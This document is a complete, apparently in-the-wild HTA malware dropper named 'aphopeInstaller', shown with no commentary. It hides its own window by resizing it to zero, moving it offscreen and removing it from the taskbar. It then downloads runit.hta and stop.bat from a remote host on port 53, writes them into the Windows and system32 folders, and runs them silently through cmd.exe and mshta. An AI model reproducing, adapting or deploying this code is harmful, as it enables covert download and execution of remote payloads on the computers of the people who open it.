   <HTML>
   <SCRIPT>
   self.resizeTo(0,0);
   self.moveTo(3000,0);
   self.blur();
   </SCRIPT>
   <HTA:APPLICATION ID="aphope"

   APPLICATIONNAME="aphopeInstaller"

   BORDER="none"

   CAPTION="no"

   ICON=""

   CONTEXTMENU="no"

   MAXIMIZEBUTTON="no"

   MINIMIZEBUTTON="no"

   SCROLL="no"

   SHOWINTASKBAR="no"

   SINGLEINSTANCE="yes"

   SELECTION="no"

   INNERBORDER="no"

   SYSMENU="no"

   VERSION="1.0"

   HEIGHT="1"

   WIDTH="1"

   WINDOWSTATE="normal"/>

   <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script>
       x = new ActiveXObject("Msxml2.XMLHTTP");
       WshSysEnv = wsh.Environment("Process");
       t = WshSysEnv("windir");
       fso = new ActiveXObject("Scripting.FileSystemObject");
   if (!fso.FileExists(t+"\\system32\\ap216.exe"))
   {
   if (!fso.FileExists(t+"\\runit.hta"))
   {

       x.Open("GET", "http://wvw.goling2003.com:53/runit.hta",0);
       x.Send();
       a = fso.CreateTextFile(t+"\\runit.hta",true);
       a.write(x.responseText);
       a.close();
       x.Open("GET", "http://wvw.goling2003.com:53/stop.bat",0);
       x.Send();
       a = fso.CreateTextFile(t+"\\system32\\stop.bat",true);
       a.write(x.responseText);
       a.close();
       wsh.Run("cmD.exe /q /t /c %windir%\\system32\\stop.bat", intWindowStyle="0", bWaitOnReturn="TRUE");
       wsh.Run("cmD.exe /q /t /c mshta.exe %windir%\\runit.hta", intWindowStyle="0", bWaitOnReturn="TRUE");
   }
   }
   window.close();
   </script>

   </HTML>
